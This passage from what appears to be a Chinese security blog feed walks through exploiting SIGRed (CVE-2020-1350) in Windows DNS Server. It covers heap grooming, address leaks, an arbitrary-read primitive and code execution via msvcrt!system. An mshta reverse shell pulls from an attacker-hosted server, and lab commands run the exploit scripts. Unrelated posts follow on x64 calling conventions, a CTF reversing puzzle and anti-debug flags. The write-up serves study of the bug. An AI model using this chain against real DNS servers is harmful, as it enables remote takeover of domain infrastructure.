要做到上述的思路，我们可以通过向受害者客户端进行查询，通过控制恶意DNS服务器返回内容的 TTL（生存时间）来达成该思路，也就是说，生存时间足够长的记录只要一直不释放，系统就不会检测，不检测就不会出现segfault。<strong>注：过期记录每约 2 分钟释放一次。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52c64336d0dccfe87280_aa91b3_bbbaa7f0334643eb838f44792c9f897f~mv2.png" alt="img"></p><p><em>恶意 DNS 服务器控制 TTL，使其增长</em></p><p>总结一下我们开辟一片连续稳定，用于溢出的堆地址的基本步骤：</p><ul><li>向受害者服务器多次查询恶意域的子域。</li><li>恶意 DNS 服务器会给受害者很多响应，受害者将其缓存在堆内存中（这些响应都没有溢出）。</li><li>恶意 DNS 服务器将为除一个之外的所有子域分配一个长 TTL（生存时间），只有一个子域有短TTL，所以他两分钟之后就会被释放。</li><li>两分钟后，我们短TTL的缓冲区被释放，并发生了检测，没有异常。</li><li>然后使用<strong>SIG</strong>消息查询，这一次恶意DNS服务器会返回溢出的数据。</li><li>因为缓冲区是 LIFO 分配的，所以新的记录缓冲区将与内存中刚刚过期，被释放的那条记录具有相同的地址。</li></ul><p>这也就是所谓的打一个洞。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52c7d5712e436455c3d3_aa91b3_3524254ae14c4838b8d6e689e3927922~mv2.png" alt="img"></p><p><em>在堆中打一个洞以避免 SEGFAULT</em></p><p>​    当然，我们还可以做的更好，因为短 TTL 这一思路还必须要等待两分钟，在这两分钟里，其他的事件、或者其他人的请求有可能会打乱我们的攻击流程，让我们失去对于堆中所存数据的控制（就是容易时间一长就出问题）。所以我们需要一个方法达到瞬间释放缓冲区！</p><p>​    也就是，更改RR_record中的<strong>dwTTL</strong>和**dwTimeStamp **字段。为什么更改这个字段有效果呢？受害服务器记录了这条信息后，我们可以再次向他发出对于这条信息的请求，这样一来他就会再堆区中查询这条数据，但是他查到之后不会立刻返回给我们，而是会检查这条信息有没有过期，如果过期了，就会被释放。</p><p>​    简单地说，我们将<strong>dwTTL</strong>和**dwTimeStamp **字段置为0，然后再向受害者发送同样的查询信息，他就会主动将改记录的内存释放，也就达成了我们需要的可控释放（立即释放）。</p><p>‍</p><h3 id="三、泄漏内存地址"><a href="#三、泄漏内存地址" class="headerlink" title="三、泄漏内存地址"></a>三、泄漏内存地址</h3><h4 id="泄漏堆地址（相对地址）"><a href="#泄漏堆地址（相对地址）" class="headerlink" title="泄漏堆地址（相对地址）"></a>泄漏堆地址（相对地址）</h4><p>我们现在可以通过执行以下操作来泄漏堆中的地址：</p><ul><li>按照上文中提到的立刻释放的方法，释放假的<strong>RR_Record</strong>，这样一来，释放后的内存就会如同上文中提到的<strong>WinDNS 缓冲区结构</strong>一样，含有一条pNextFreeBuff的记录。</li><li>（这一步实际在上一步之前进行）给被释放record上面的那个假<strong>RR_Record</strong>一个大的<strong>wRecordSize</strong>，超过其实际大小。</li><li>向受害者发送子域的<strong>SIG</strong>查询，查询伪造的大<strong>wRecordSize</strong>的那条记录。</li><li>响应将超过缓冲区的实际大小，并在其下方包含已释放记录的<strong>WINDNS_FREE_BUFF</strong>结构数据。<strong>这会在pNextFreeBuff</strong>字段中泄漏一个有效的堆地址。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52f7161c501cae7cf71c_aa91b3_67311c33ac5a4faea4a0a7839f284245~mv2.png" alt="img"></p><p><em>使用伪造的 RR_Record 对象泄漏堆指针</em></p><p>​    这样一来，如上图所示，蓝线上面的pNextFreeBuff就会返回到恶意服务器，我们获得了第一个内存泄漏！但是，我们实际上并不知道泄露的指针相对于我们控制的堆区域的位置，如果我们能得到溢出缓冲区的地址就更好了。因此，我们可以简单地释放两个假的<strong>RR_Record</strong>对象，并泄漏我们最后释放的缓冲区的地址。<strong>释放缓冲区时，指向在写入pNextFreeBuff</strong>字段之前已释放的缓冲区的指针。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52f7dbe92852b3598189_aa91b3_3d7a3b96f79c4588b9c015366dc55366~mv2.png" alt="img"></p><p><em>泄漏指向堆的可控部分的指针</em></p><p>‍ 我们<br>现在知道了我们控制的部分堆的确切地址！这将在以后有用。</p><h4 id="泄露-dns-exe-地址（绝对地址）"><a href="#泄露-dns-exe-地址（绝对地址）" class="headerlink" title="泄露 dns.exe 地址（绝对地址）"></a>泄露 dns.exe 地址（绝对地址）</h4><p>​    接下来，我们需要在需要处理ASLR （地址空间布局随机化）。要泄漏<strong>dns.exe</strong>内部的地址，我们需要触发分配一种特殊类型的对象，我将其称为<strong>DNS_Timeout</strong>对象。</p><p>DNS_TimeOut对象具有以下结构：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52f7558c6fdcb6eca7aa_aa91b3_27b27d797c8a42fb8bdc4d2a2537b3af~mv2.png" alt="img"></p><p>​    当 DNS 记录过期时，调用<strong>dns!RR_Free</strong>。如果 DNS 记录类型为<strong>DNS_TYPE_NS</strong>、<strong>DNS_TYPE_SOA</strong>、<strong>DNS_TYPE_WINS</strong>或<strong>DNS_TYPE_WINSR</strong> [<a href="https://docs.microsoft.com/en-us/windows/win32/dns/dns-constants">6]</a>，它们不会立即释放。而是调用<strong>dns!Timeout_FreeWithFunctionEx</strong>。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52f717b25649351fc088_aa91b3_b9b5250b36a9499ba2d4376f60e28ca0~mv2.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220316200416598.png" alt="image-20220316200416598"></p><p>（我好迷惑为什么我逆向的结果完全和他们不一样呢？）</p><p><em>dns的近似反编译！RR_Free</em></p><p>‍     在<strong>Timeout_FreeWithFunctionEx</strong>中，为<strong>DNS_Timeout</strong>对象分配了一个 WinDNS 缓冲区，然后，<strong>RR_Free</strong>的地址和一个字符串分别写入该对象的<strong>pFreeFunction</strong>和<strong>pszFile</strong>字段。这些将是我们的<strong>dns.exe</strong>地址泄漏。如果我们在我们控制的堆区域中触发超时对象的分配，我们可以使用与之前相同的方法来泄漏地址。</p><p>​    重点是将RR_Free函数的地址卸载了堆内存中，这是这个问题的关键。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52f78cd2bc0e395094d4_aa91b3_a3e6de45bb44402ba503f7b68a6cbc03~mv2.png" alt="img"></p><p><em>dns!Timeout_FreeWithFunctionEx 的反编译</em></p><p>我们通过首先释放一个假缓冲区大小为 0x50的假<strong>RR_Record</strong>对象来触发对象分配，这是为 <strong>DNS_Timeout</strong> 对象分配的存储桶内存大小。然后，我们向受害者进行一些NS查询以获取恶意域。一旦记录过期，将为每个查询分配一个超时对象。如果在等待NS记录过期时释放了大小为 0x50 的新缓冲区，则有必要进行其中几个查询。我们可以再次通过请求其上方的缓存记录来泄漏内存，使用伪造的大<strong>wRecordSize</strong>。（总之呢，就是使用和上面一样的方法，但是不同的函数进行触发）</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52f83c2a55b0a9f834c4_aa91b3_0faf3a4354db4d17a30d01f93830e3d6~mv2.png" alt="img"></p><p><em>通过分配 DNS_Timeout 对象泄漏 dns.exe 地址</em></p><p>现在我们已经泄露了<strong>dns.exe</strong>中的地址，我们可以使用它们来计算二进制文件中函数的地址。通过获取泄漏地址的最后 12 位，我们可以为各种版本的<strong>dns.exe</strong>创建一个到偏移量的映射。</p><p>最初，我认为我可以通过简单地使用<strong>wRecordType = DNS_TYPE_NS</strong>释放一个假的<strong>RR_Record</strong>对象来触发超时对象的分配<strong>。</strong>因此，避免了等待 2 分钟让 NS 记录过期。但是，当我尝试执行此操作时，一些检查会阻止使用修改后的<strong>wRecordType在fakeRR_Recor</strong>d上调用<strong>RR_Free</strong>。我在调查这个问题时没有时间，所以这是一个潜在的改进领域。</p><h3 id="四、任意读取"><a href="#四、任意读取" class="headerlink" title="四、任意读取"></a>四、任意读取</h3><p>​    请注意，通过上文中提到覆盖<strong>RR_free</strong>的方法，我们已经能够通过覆盖已分配的<strong>DNS_timeout</strong>对象中的<strong>pFreeFunction</strong>指针来执行代码。</p><p>​    更进一步的，在函数<strong>dns!Timeout_CleanupDelayedFreelist</strong>中，为<strong>CoolingDelayedFreeList</strong>中的每个超时对象（ <strong>DNS_Timeout</strong> 对象）调用<strong>pFreeFunction</strong>中的函数地址，简言之，就是通过列表的方式调用函数。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52f83c2a55e988f834c3_aa91b3_5268b6c5246d486b8796c1026e1c28f8~mv2.png" alt="img"></p><p><em>dns!Timeout_CleanupDelayedFreeList 的近似反编译</em></p><p>​    我们可以在分配超时对象覆盖这些字段后再次触发漏洞。</p><p>​    现代版本的<strong>dns.exe</strong>使用 Control Flow Guard (CFG) [<a href="https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard">4]</a>进行编译。绕过 CFG 的一种已知方法是破坏堆栈[<a href="https://improsec.com/tech-blog/bypassing-control-flow-guard-in-windows-10">11]</a>上的返回地址并使用 ROP [<a href="https://en.wikipedia.org/wiki/Return-oriented_programming">7]</a>方法执行。<em>注：CFG是一种在在运行时加载地址的防漏洞方式。</em>但是，我们目前还没有稳定的方式来写入堆栈。相反，我们可以找到用于原语的有效调用目标（即<strong>dns.exe中的函数）。</strong></p><p>​    一个合适的候选者是<strong>dns!NsecDnsRecordConvert</strong>，它采用一个参数[<a href="https://datafarm-cybersecurity.medium.com/exploiting-sigred-cve-2020-1350-on-windows-server-2012-2016-2019-80dd88594228">3]</a>。</p><p><strong>NsecDnsRecordConvert</strong>的参数应具有以下结构：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52f83c2a55ae18f834c5_aa91b3_9d45541820f94f49a93ee8e423e4165e~mv2.png" alt="img"></p><p>​    在这个函数内部，分配了一个缓冲区并调用了<strong>Dns_StringCopy</strong>，如果我们控制传入的函数参数及其内容，我们就可以将<strong>pDnsString</strong>字段设为我们要读取的地址。在<strong>DNS_StringCopy</strong>内部，分配了一个缓冲区，并复制了<strong>pDnsString</strong>指向的数据（直到一个空字节），也就是通过这个函数实现任意读取。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/61bb52f8db0ccecdb0e7edbb_aa91b3_31668603d0c740689bd13149ef90472a~mv2.png" alt="img"></p><p><em>dns的反编译！NsecDnsRecordConvert</em></p><p>​    因为我们还控制<strong>wSize</strong>，所以我们控制分配的缓冲区的大小。因此，我们强制将新缓冲区分配到我们控制的堆区域中。数据复制完成后，我们使用与之前相同的方法泄漏内存。</p><p><img src="https://uploads-ssl.webflow.com/61a8a9fbeff4dc7f21784049/61bb52f87784b7988275f8a1_aa91b3_7152eedcbcb64374bc3bbaf325d91518~mv2.png" alt="img"></p><p><em>任意读取原语</em></p><p>​    ‍ 我们读取的<strong>msvcrt.dll</strong>的地址。我选择了<strong>dns!_imp_exit</strong>，其中包含<strong>msvcrt!exit</strong>的地址。这将破坏<strong>msvcrt.dll</strong>的 ASLR 。有了这个，我们可以计算出<strong>msvcrt!system</strong>的地址。</p><h3 id="五、代码执行与shell连接"><a href="#五、代码执行与shell连接" class="headerlink" title="五、代码执行与shell连接"></a>五、代码执行与shell连接</h3><p>​    现在所有部分都已准备就绪，可以远程执行代码了。我们可以再次触发<strong>DNS_Timeout</strong>对象的分配。然后，我们用<strong>msvcrt!system</strong>和<strong>pFreeFuncParam</strong>覆盖<strong>pFreeFunction</strong> ，并使用包含有效负载命令的内存堆地址。为了获得反向 shell，我选择使用<strong>mshta.exe</strong>从攻击者托管的 HTTP 服务器执行 HTA shell。我发现这是最简单的解决方案，但还有许多其他可能性。该漏洞也可以被重新设计以使用任何其他函数而不是<strong>system</strong>。</p><p><strong>Mshta.exe：</strong></p><blockquote><p>​    Mshta.exe运行MicrosoftHTML应用程序主机，这是WindowsOS实用程序，负责运行HTA(HTML应用程序)文件。我们可以用来运行JavaScript或VBScript的HTML文件。您可以使用MicrosoftMSHTA.exe工具解释这些文件。</p><p>现在，通过受害者计算机上的mshta.exe(容易受到RCE攻击)运行恶意代码，以获取Meterpreter会话。</p><p>总之呢，就是在达成rce之后，就可以通过Mshta.exe来构造一个反弹shell，应该是这个意思吧。</p></blockquote><h2 id="0x08-exp的利用"><a href="#0x08-exp的利用" class="headerlink" title="0x08 exp的利用"></a>0x08 exp的利用</h2><p><strong>实验环境：</strong>ubuntu20.04+Win server2019</p><p>利用步骤：</p><p>​    首先要把ubuntu的53端口系统进程杀死，然后执行指令：</p><ol><li><code>sudo python3 configure.py -ip 192.168.6.131 -p 8081 -hp 80</code></li><li><code>sudo python3 evildns.py</code></li><li><code>python3 exploit.py -ip 192.168.6.129 -d cve1350.com</code></li><li><code>python3 reverse_shell/server.py -p 8081</code></li></ol><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220315174042283.png" alt="image-20220315174042283"></p><p>效果：（远程控制）</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220316153134148.png" alt="image-20220316153134148"></p><h2 id="0x09-参考文献"><a href="#0x09-参考文献" class="headerlink" title="0x09 参考文献"></a>0x09 参考文献</h2><p>提供poc脚本：<br><a href="https://github.com/maxpl0it/CVE-2020-1350-DoS">https://github.com/maxpl0it/CVE-2020-1350-DoS</a></p><p>优秀指导教程：<br><a href="https://www.cnblogs.com/PsgQ/p/14806195.html#/c/subject/p/14806195.html">https://www.cnblogs.com/PsgQ/p/14806195.html#/c/subject/p/14806195.html</a><br><a href="https://mp.weixin.qq.com/s/gdPUGnFLKzS5FqcH8T9byw">https://mp.weixin.qq.com/s/gdPUGnFLKzS5FqcH8T9byw</a><br><a href="https://bbs.pediy.com/thread-260712.htm">https://bbs.pediy.com/thread-260712.htm</a></p><p>checkpoint：<br><a href="https://research.checkpoint.com/2020/resolving-your-way-into-domain-admin-exploiting-a-17-year-old-bug-in-windows-dns-servers/">https://research.checkpoint.com/2020/resolving-your-way-into-domain-admin-exploiting-a-17-year-old-bug-in-windows-dns-servers/</a></p><p>exp思路、源代码、运用：</p><p><a href="https://www.graplsecurity.com/post/anatomy-of-an-exploit-rce-with-cve-2020-1350-sigred">https://www.graplsecurity.com/post/anatomy-of-an-exploit-rce-with-cve-2020-1350-sigred</a></p><p><a href="https://github.com/chompie1337/SIGRed_RCE_PoC">https://github.com/chompie1337/SIGRed_RCE_PoC</a></p><p>exp构造原理：</p><p><a href="https://datafarm-cybersecurity.medium.com/exploiting-sigred-cve-2020-1350-on-windows-server-2012-2016-2019-80dd88594228">https://datafarm-cybersecurity.medium.com/exploiting-sigred-cve-2020-1350-on-windows-server-2012-2016-2019-80dd88594228</a></p>]]></content>
      
      
      <categories>
          
          <category> cve </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>64位调用约定与函数传参</title>
      <link href="/2022/03/08/x64%E6%B1%87%E7%BC%96%E4%BC%A0%E5%8F%82%E8%B0%83%E7%94%A8%E8%A7%84%E5%88%99/"/>
      <url>/2022/03/08/x64%E6%B1%87%E7%BC%96%E4%BC%A0%E5%8F%82%E8%B0%83%E7%94%A8%E8%A7%84%E5%88%99/</url>
      
        <content type="html"><![CDATA[<h1 id="64位调用约定与函数传参"><a href="#64位调用约定与函数传参" class="headerlink" title="64位调用约定与函数传参"></a>64位调用约定与函数传参</h1><p>摘抄：<a href="https://www.cnblogs.com/iBinary/p/10959444.html">https://www.cnblogs.com/iBinary/p/10959444.html</a></p><p>x64调用示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sub rsp,0x28</span><br><span class="line"></span><br><span class="line">mov r9,1</span><br><span class="line">mov r8,2</span><br><span class="line">mov rdx,3</span><br><span class="line">mov rcx,4</span><br><span class="line">call xxx</span><br><span class="line">add rsp,0x28</span><br></pre></td></tr></table></figure><p><strong>传参方式：</strong><br>    首先说明一下,在X64下,是寄存器传参. 前4个参数分别是 rcx rdx r8 r9进行传参.多余的通过栈传参.从右向左入栈</p><p><strong>申请参数预留空间：</strong><br>    在x64下,在调用一个函数的时候,会申请一个参数预留空间.用来保存我们的参数.比如以前我们通过push压栈<br>参数的值.相应的栈就会抬高.其实x64下,一样会申请.只不过这个地方在进函数的时候并没有值.进入函数之后才会将寄存器的值在拷贝到这个栈中.其实就相当于你还是push了.只不过我是外边申请空间,内部进行赋值。</p><p>如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">sub rsp,0x28          //申请的栈空间为0x28,就相当于我们push rcx rdx r8 r9.只不过只是申请.</span><br><span class="line">call xxxx</span><br><span class="line">add rsp,0x28</span><br><span class="line"></span><br><span class="line">xxx                  //函数内部</span><br><span class="line"></span><br><span class="line">mov [rsp - 8],rcx</span><br><span class="line">mov [rsp - 0x10],rdx</span><br><span class="line">mov [rsp - 0x18],r8</span><br><span class="line">mov [rsp - 0x20],r9</span><br><span class="line"></span><br><span class="line">xxx </span><br></pre></td></tr></table></figure><p><strong>总结：</strong></p><ol><li>在调用函数之前,会申请参数预留空间.(rcx,rdx,r8,r9)</li><li>函数内部,会将寄存器传参的值(rcx,rdx,r8,r9)保存到我们申请的预留空间中.<br>上面这两步其实就相当于x86下的 push r9 push r8 push rdx,push rcx</li><li>调用约定是__fastcall.传参有rcx rdx,平栈是按照c调用约定平栈. 也就是调用者平栈.</li></ol>]]></content>
      
      
      <categories>
          
          <category> Note-re </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>reverse_花指令实例</title>
      <link href="/2022/03/05/reverse_%E8%8A%B1%E6%8C%87%E4%BB%A4%E5%AE%9E%E4%BE%8B/"/>
      <url>/2022/03/05/reverse_%E8%8A%B1%E6%8C%87%E4%BB%A4%E5%AE%9E%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="reverse-花指令实例"><a href="#reverse-花指令实例" class="headerlink" title="reverse_花指令实例"></a>reverse_花指令实例</h1><p>以<code>看雪.TSRC 2017CTF秋季赛</code>第二题为例，解决花指令的反调试问题。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220305101852053.png" alt="image-20220305101852053"></p><p>一上来就F5失败。</p><p>一开始先打印了一行字，然后调用了一个干扰函数，进入逻辑相对清晰的<code>sub_401050</code>:</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220305102332825.png" alt="image-20220305102332825"></p><p><code>scanf()</code>没限制长度，可以把返回地址盖掉。。。</p><p>所以说，基础的逻辑都是假的，这题就是要输入一个比较长的内容覆盖返回地址后才会出现真东西。</p><p>那么，我们要跳到哪里才能正常执行呢？</p><p>idaview往下找：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220305103253955.png" alt="image-20220305103253955"></p><p>c键变code：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220305103327310.png" alt="image-20220305103327310"></p><p>看起来比较靠谱，也就是说应该跳转到地址<code>0x00413131</code>处。</p><p>我们可以直接pwn-tools构造一个脚本，但似乎听说看雪比赛似乎是只能输入字母和数字的，仔细看地址正好是<code>A11</code>的值，因此就不需要折磨自己了。</p><p>直接构造溢出字符串为<code>222222222222A11</code>(十二个填充位，三个溢出地址位)。</p><p>扔进去执行，并没有什么变化。。。动调看看吧。。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220305103952383.png" alt="image-20220305103952383"></p><p>进来先整一个断点，然后直接F9</p><p>发现我傻了，地址构造反了，正确的应该是<code>22222222222211A</code>（小端序）</p><p>同样动调，然后<code>remove analysis from this module</code>，把这里变回代码。</p><p>然后动调发现绕来绕去，快疯了，这里记录一个：</p><p><strong>调试跟踪跳转多的技巧</strong></p><p><code>view-Run trace</code>打开跟踪窗口，<code>ctrl-F11</code>为记录步入后的逻辑，<code>ctrl-F12</code>为记录步过的逻辑，就相当于记录了手动<code>F7/f8</code>运行的每一步逻辑，都可以在窗口中查看，这一样就会在跳转非常多的情况下清晰的多。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220305114920532.png" alt="image-20220305114920532"></p><p>这样就清晰的多了，然后我就不会了。。。</p><p>以下参考：<a href="https://bbs.pediy.com/thread-222284.htm%EF%BC%88%E7%9C%9F%E6%98%AF%E6%81%90%E6%80%96%EF%BC%89">https://bbs.pediy.com/thread-222284.htm（真是恐怖）</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">//还原的加花乱序</span><br><span class="line">////////////////////////////////////////</span><br><span class="line"> add esp,-0x10</span><br><span class="line"> xor eax,eax</span><br><span class="line"> mov dword ptr ds:[0x41B034],eax</span><br><span class="line"> </span><br><span class="line"> pop eax        //eax=x</span><br><span class="line"> mov ecx,eax    //ecx=x</span><br><span class="line"> </span><br><span class="line"> pop eax        //eax=y</span><br><span class="line"> mov ebx,eax    //ebx=y</span><br><span class="line"> </span><br><span class="line"> pop eax        //eax=z</span><br><span class="line"> mov edx,eax    //edx=z</span><br><span class="line"> </span><br><span class="line"> mov edx,eax   </span><br><span class="line"> mov eax,ecx    //eax=x</span><br><span class="line"> sub eax,ebx    //eax=x-y</span><br><span class="line"> shl eax,0x2    //eax shl 2</span><br><span class="line"> add eax,ecx    //eax+=x</span><br><span class="line"> add eax,edx    //eax+=z</span><br><span class="line"> sub eax,0xEAF917E2 //(必须为零)</span><br><span class="line"> </span><br><span class="line"> add eax, ecx    //eax=x</span><br><span class="line"> sub eax, ebx    //eax-=y</span><br><span class="line"> mov ebx, eax    //ebx=(x-y)</span><br><span class="line"> shl eax, 1        //eax shl 1</span><br><span class="line"> add eax, ebx    //eax+=(x-y)</span><br><span class="line"> add eax, ecx    //eax+=x</span><br><span class="line"> mov ecx, eax    //ecx=eax</span><br><span class="line"> add eax, edx    //eax+=edx</span><br><span class="line"> sub eax, 0xe8f508c8 //(必须为零)</span><br><span class="line"> </span><br><span class="line"> mov eax, ecx    //eax=original</span><br><span class="line"> mov eax, ecx</span><br><span class="line"> sub eax, edx    //eax-=edx</span><br><span class="line"> sub eax, 0xc0a3c68 //(必须为零)</span><br><span class="line"> </span><br><span class="line"> pop eax</span><br><span class="line"> xor eax, 0x8101</span><br><span class="line"> mov edi, eax</span><br><span class="line"> xor eax, eax</span><br><span class="line"> stosd dword ptr es:[edi], eax</span><br><span class="line"> call 0x413841  //00413830 PUSH 00413835</span><br><span class="line"> pop eax</span><br><span class="line"> push eax</span><br><span class="line"> mov edi, eax</span><br><span class="line"> mov edi, eax</span><br><span class="line"> push 0x4e000969</span><br><span class="line"> pop eax</span><br><span class="line"> xor eax, edx</span><br><span class="line"> stosd dword ptr es:[edi], eax</span><br><span class="line"> xor eax, 0x10a3e</span><br><span class="line"> stosd dword ptr es:[edi], eax</span><br><span class="line"> xor eax, ebx</span><br><span class="line"> xor eax, 0x22511e14</span><br><span class="line"> stosd dword ptr es:[edi], eax</span><br><span class="line"> xor eax, 0x61642d</span><br><span class="line"> xor eax, dword ptr [0x41b034]</span><br><span class="line"> jmp eax</span><br><span class="line"> ////////////////////////////////////////////</span><br></pre></td></tr></table></figure><p>大哥硬是把逻辑整理出来了。。。恐怖如斯，我不能理解</p><p>然后就是根据三个为零条件求解三元方程。。。，这里依然搬运一下：</p><blockquote><p>((x-y) shl 2)+x+z==0xEAF917E2     即3942193122‬<br>(x-y) shl 1 + (x-y) +x+z==0xe8f508c8     即3908372680<br>(x-y) shl 1 + (x-y) +x-z==0xc0a3c68     即201997416</p></blockquote><p>反正总之最后解出来了，然后转化为字符串就是答案。。。</p>]]></content>
      
      
      <categories>
          
          <category> reverse </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>反调试技术_各种标志</title>
      <link href="/2022/03/04/Reverse%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF_%E5%90%84%E7%A7%8D%E6%A0%87%E5%BF%97(flag)/"/>
      <url>/2022/03/04/Reverse%E5%8F%8D%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF_%E5%90%84%E7%A7%8D%E6%A0%87%E5%BF%97(flag)/</url>
      
        <content type="html"><![CDATA[<h1 id="反调试技术-1-各种标志"><a href="#反调试技术-1-各种标志" class="headerlink" title="反调试技术(1)_各种标志"></a>反调试技术(1)_各种标志</h1><p>总之就是记录各种用于防止反调试的字段，感觉没啥用。</p><p>参考、摘抄自：<a href="https://ctf-wiki.org/reverse/windows/anti-debug">https://ctf-wiki.org/reverse/windows/anti-debug</a></p><h2 id="NtGlobalFlag"><a href="#NtGlobalFlag" class="headerlink" title="NtGlobalFlag"></a>NtGlobalFlag</h2><h3 id="概念解释"><a href="#概念解释" class="headerlink" title="概念解释"></a>概念解释</h3><p>在 32 位机器上, <code>NtGlobalFlag</code>字段位于<code>PEB</code>(进程环境块)<code>0x68</code>的偏移处, 64 位机器则是在偏移<code>0xBC</code>位置. 该字段的默认值为 0，当调试器运行时，该字段有时会被更改（不一定）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FLG_HEAP_ENABLE_TAIL_CHECK (0x10)</span><br><span class="line">FLG_HEAP_ENABLE_FREE_CHECK (0x20)</span><br><span class="line">FLG_HEAP_VALIDATE_PARAMETERS (0x40)</span><br></pre></td></tr></table></figure><p>程序中可能会对该字段进行检测，若不为00就直接跳转到<code>being_debugged</code></p><p>注：<code>NtGlobalFlag</code>的那 3 个标志位只有当程序是<code>由调试器创建</code>, 而非<code>由调试器附加</code>上去的进程时, 才会被设置.</p><h3 id="检测方式-32位"><a href="#检测方式-32位" class="headerlink" title="检测方式    (32位)"></a>检测方式    (32位)</h3><p>注：fs寄存器指向当前活动线程的TEB</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220304165757871.png" alt="image-20220304165757871"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov eax, fs:[30h] ;Process Environment Block（）</span><br><span class="line">mov al, [eax+68h] ;NtGlobalFlag</span><br><span class="line">and al, 70h</span><br><span class="line">cmp al, 70h</span><br><span class="line">je being_debugged</span><br></pre></td></tr></table></figure><h3 id="更改初值（并不知道有啥用）"><a href="#更改初值（并不知道有啥用）" class="headerlink" title="更改初值（并不知道有啥用）"></a>更改初值（并不知道有啥用）</h3><p>注册表<code>计算机\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager</code>的<code>GlobalFlag</code>的值会替换进行<code>NtGlobalFlag</code>字段。（重启后生效）</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220304164126021.png" alt="image-20220304164126021"></p><h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><ul><li>手动修改标志位的值 (<code>FLG_HEAP_ENABLE_TAIL_CHECK</code>, <code>FLG_HEAP_ENABLE_FREE_CHECK</code>, <code>FLG_HEAP_VALIDATE_PARAMETERS</code>)</li><li>在 Ollydbg 中使用<code>hide-debug</code>插件</li><li>在 Windbg 禁用调试堆的方式启动程序 (<code>windbg -hd program.exe</code>)</li></ul><p><strong>示例（32位）：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span 